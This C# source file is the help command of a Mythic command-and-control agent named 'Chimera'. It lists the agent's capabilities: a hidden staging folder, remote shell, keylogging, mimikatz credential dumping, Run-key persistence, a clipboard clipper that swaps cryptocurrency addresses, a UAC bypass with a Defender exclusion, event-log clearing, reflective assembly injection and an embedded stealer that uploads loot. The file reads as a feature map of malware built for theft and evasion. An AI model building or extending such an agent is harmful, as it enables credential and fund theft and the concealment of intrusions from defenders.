using System;
using System.Text;

namespace Chimera.Commands
{
    public static class Help
    {
        public static string Execute()
        {
            var sb = new StringBuilder();
            sb.AppendLine("Chimera Agent — Available Commands");
            sb.AppendLine("===================================");
            sb.AppendLine("Staging dir: C:\\Users\\Public\\Chrome (hidden)");
            sb.AppendLine();
            sb.AppendLine("-- Recon --");
            sb.AppendLine("shell <cmd>              Run a command via cmd /c");
            sb.AppendLine("ls [path]                List directory contents");
            sb.AppendLine("pwd                      Print working directory");
            sb.AppendLine("cd <path>                Change working directory");
            sb.AppendLine("ps                       List running processes with PID/user/arch");
            sb.AppendLine("screenshot               Capture desktop, upload to Mythic");
            sb.AppendLine();
            sb.AppendLine("-- Credentials --");
            sb.AppendLine("keylog start             Install low-level keyboard hook");
            sb.AppendLine("keylog dump              Return captured keystrokes so far");
            sb.AppendLine("keylog stop              Stop hook, return all captured keystrokes");
            sb.AppendLine("mimikatz                 Dump credentials via embedded mimikatz_enc");
            sb.AppendLine();
            sb.AppendLine("-- Persistence --");
            sb.AppendLine("persist                  Fileless XOR blob -> staging dir + HKCU Run");
            sb.AppendLine("persist remove           Remove persistence blob and Run key");
            sb.AppendLine();
            sb.AppendLine("-- Crypto Hijacking --");
            sb.AppendLine("clipper start            Monitor clipboard, swap crypto addresses");
            sb.AppendLine("clipper stop             Stop clipboard monitor");
            sb.AppendLine("clipper status           Show state and swap addresses");
            sb.AppendLine();
            sb.AppendLine("-- Evasion / Elevation --");
            sb.AppendLine("bypass [cmd]             UAC bypass via fodhelper + Defender C:\\ exclusion");
            sb.AppendLine("clearlogs                Stop EventLog service, clear Security/System/App logs");
            sb.AppendLine();
            sb.AppendLine("-- Injection --");
            sb.AppendLine("inject_assembly <b64>    Reflectively load and run a .NET assembly (base64)");
            sb.AppendLine("run_stealer              Decrypt embedded stealer, write to staging, upload loot");
            sb.AppendLine();
            sb.AppendLine("-- File Transfer --");
            sb.AppendLine("upload <local> [remote]  Upload file from agent to Mythic");
            sb.AppendLine("download <url> <local>   Download file from Mythic to agent");
            sb.AppendLine("sleep <seconds> [jitter] Change beacon interval");
            sb.AppendLine();
            sb.AppendLine("kill                     Terminate agent process");
            sb.AppendLine("help                     Show this help");
            return sb.ToString();
        }
    }
}
